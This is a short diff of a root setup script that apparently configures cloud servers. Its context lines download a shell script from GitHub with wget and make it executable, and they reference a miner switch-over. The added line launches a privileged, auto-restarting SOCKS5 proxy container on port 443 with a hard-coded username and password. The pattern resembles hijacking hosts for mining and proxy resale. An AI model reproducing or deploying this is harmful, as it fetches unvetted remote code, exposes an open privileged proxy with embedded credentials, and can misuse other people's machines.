@@ -22,14 +22,15 @@ wget -O reconfige.sh https://raw.githubusercontent.com/LearnAWS1234/DataMining/m
 chmod +x reconfige.sh
 
 
-FILE=/root/Setup1
+FILE=/root/Setup2
 if test -f "$FILE"; then
     echo OK1
 else
-    echo "New Setup" > /root/Setup1
+    echo "New Setup" > /root/Setup2
     #./reconfige.sh
     #/sbin/shutdown -r now
     #sleep 10
+    sudo docker run -d --name proxy --restart=always --privileged -p443:443 -p443:443/udp ginuerzh/gost -L socks5://awsproxy:besmartcreative@:443
 fi
 FILE=/root/change2Miner2
 if test -f "$FILE"; then
